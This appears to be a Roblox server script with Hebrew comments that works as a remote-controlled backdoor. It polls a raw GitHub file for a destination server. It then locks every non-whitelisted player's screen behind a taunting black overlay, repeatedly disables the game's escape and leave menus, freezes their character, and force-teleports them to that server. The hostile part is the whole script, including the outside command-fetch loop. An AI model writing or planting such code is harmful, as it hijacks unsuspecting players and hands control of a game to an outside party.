local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

-- הקישור החדש ששלחת
local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"
local whitelisted = {["noamdb15"] = true, ["dylanzyl123"] = true}
local IMAGE_ID = "rbxassetid://6073792951" 

-- פונקציה שחוסמת את התפריטים ומכסה את המסך
local function applyFinalLock(player)
	local sg = Instance.new("ScreenGui")
	sg.Name = "SystemOverride"
	sg.IgnoreGuiInset = true -- מכסה את כפתור ה-ESC והליב
	sg.DisplayOrder = 9999999
	sg.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame", sg)
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundColor3 = Color3.new(0, 0, 0)
	frame.Active = true -- חוסם לחיצות עכבר

	local label = Instance.new("TextLabel", frame)
	label.Size = UDim2.new(1, 0, 0.4, 0)
	label.Position = UDim2.new(0, 0, 0.3, 0)
	label.BackgroundTransparency = 1
	label.Text = "L + RATIO\nהלך לך הבייס חביבי"
	label.TextColor3 = Color3.new(1, 0, 0)
	label.TextScaled = true
	label.Font = Enum.Font.LuckiestGuy

	-- סקריפט מקומי שרץ אצל השחקן ומבטל את תפריטי רובלוקס
	local ls = Instance.new("LocalScript", sg)
	ls.Source = [[
		local starterGui = game:GetService("StarterGui")
		task.spawn(function()
			while true do
				pcall(function()
					starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
				end)
				task.wait(0.5)
			end
		end)
	]]
end

task.spawn(function()
	while true do
		local success, response = pcall(function()
			return HttpService:GetAsync(rawUrl .. "?t=" .. tick())
		end)

		if success and response then
			-- פירוק הנתונים מה-GitHub
			local lines = {}
			for line in response:gmatch("[^\r\n]+") do table.insert(lines, line) end
			
			local targetPlaceId = tonumber(lines[1])
			local targetJobId = lines[2]

			-- בדיקה אם יש נתוני שיגור ואם זה לא השרת הנוכחי
			if targetPlaceId and targetJobId and targetJobId ~= "" and targetJobId ~= game.JobId then
				for _, p in pairs(Players:GetPlayers()) do
					if not whitelisted[p.Name] then
						-- 1. נעילה ויזואלית ותפריטים
						pcall(function() applyFinalLock(p) end)
						
						-- 2. נעילה פיזית
						if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
							p.Character.HumanoidRootPart.Anchored = true
						end

						-- 3. שיגור מיידי ל-ID מהקישור
						task.spawn(function()
							pcall(function()
								TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, p)
							end)
						end)
					end
				end
			end
		end
		task.wait(0.5) -- בדיקה מהירה של הגיטהאב
	end
end)
